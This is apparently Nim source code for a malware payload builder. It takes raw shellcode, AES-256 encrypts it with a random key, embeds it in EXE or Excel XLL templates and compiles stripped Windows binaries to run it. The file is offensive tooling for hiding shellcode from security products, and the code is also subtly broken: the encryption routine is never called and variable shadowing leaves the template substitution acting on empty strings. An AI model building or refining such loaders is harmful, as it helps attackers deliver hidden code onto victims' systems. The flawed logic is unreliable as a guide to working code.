import base64
import strutils
import sequtils
import strformat
import os
import osproc
import nimcrypto
import random

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

let 
    args = commandLineParams()
    pCount = paramCount()

var 
    shellcodeFilePath: string
    fileType: string
    architecture: string
    verbosity: string
    file: string
    templatePath: string
    shellcode: string
    scArray: seq[byte]
    shaKey: MDigest[256]
    key: array[aes256.sizeKey, byte]
    iv: array[aes256.sizeBlock, byte]
    encSC: seq[byte]



if pCount < 2:
    echo fmt"Usage: {getAppFileName()} <rawShellcodeFile> <fileType> <architecture> <verbose>"
    echo "\nArguments <architecture> for file types other than XLL and <verbose> are optional"
    quit(1)
else: 
    shellcodeFilePath = args[0]
    fileType = args[1]

    if pCount > 2:
        architecture = args[2] #only for xll payloads

    if pCount > 3:
        verbosity = args[3]

let
    compileExe: string = r"nim c -d:mingw --opt:none --app=gui --cpu=amd64 -d:strip -d:release -o=simpleexe.exe temp_simpleexe.nim" 
    compileXll64: string = r"nim c -d:mingw --app=lib --nomain --cpu=amd64 -o=simplexll.xll temp_simplexll.nim"
    compileXll32: string = r"nim c -d:mingw --app=lib --nomain --cpu=i386 -o=simplexll.xll temp_simplexll.nim"

proc aesencrypt(): void = 
    
    ## Nim's way API using openArray[byte].

    var ectx: CBC[aes256]

    scArray = shellcode.toByteSeq
    #var plainText: array[aes256.sizeBlock * 2, byte]
    #encSC: seq[byte] = newSeq[byte](len(scArray))

    while scArray.len mod 16 != 0:
        scArray.insert(0x90, 1)
    #copyMem(addr plainText[0], addr scArray[0], len(scArray))

    randomize()
    const asciiRange = 32..126
    let passwd = 32.newSeqWith(asciiRange.rand.char).join
    var expandedKey = sha256.digest(passwd)
    shaKey = expandedKey
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))

    discard randomBytes(addr iv[0], 16)

    # Initialization of CBC[aes256] context with encryption key
    ectx.init(key, iv)
    # Encryption process
    ectx.encrypt(scArray, encSC)
    # Clear context of CBC[aes256]
    ectx.clear()

proc generatePayload(): void =
    var 
        templateFile: string
        tempFile: string
        compileCmd: string
    # Read raw shellcode file
    try:
        file = readFile(shellcodeFilePath)
    except IOError as err:
        echo "[-] Error: Could not open file!"
        quit(1)

    # Encode/Encrypt bytes
    let b64shellcode = encode(file)
    
    # Add base64 shellcode to template
    case fileType:
        of "exe":
            templatePath = "templates/simpleexe.nim"
            var templateFile = templatePath.readFile()
            var tempFile = "temp_simpleexe.nim"
            compileCmd = compileExe
        of "xll":
            templatePath = "templates/simplexll.nim"
            var templateFile = templatePath.readFile()
            var tempFile = "temp_simplexll.nim"
            if architecture == "x64":
                compileCmd = compileXll64
            else:
                compileCmd = compileXll32
        else:
            echo "Error: filetype argument must be dll, xll, or cpl!"
            quit(1)
    let placeholder = "REPLACE_ME"
    let replacement =  encode(encSC)
    echo "[*] Encrypting shellcode using AES-256 CBC!"
    templateFile = templateFile.replace(placeholder, replacement)
    tempFile.writeFile(templateFile)

    let origPass = "BLANK_PASSWORD"  
    echo "[*] Encrypting shellcode using AES-256 CBC!"
    templateFile = templateFile.replace(origPass, toHex(shaKey.data))
    tempFile.writeFile(templateFile)

    let compileResults = execCmdEx(compileCmd)
    tempFile.removeFile
    if verbosity == "verbose":
        echo compileResults.output

when isMainModule:
    if pCount >= 2:
        generatePayload()
    else:
        echo fmt"Usage: {getAppFileName()} <rawShellcodeFile> <fileType> <architecture> <verbose>"
        quit(1)
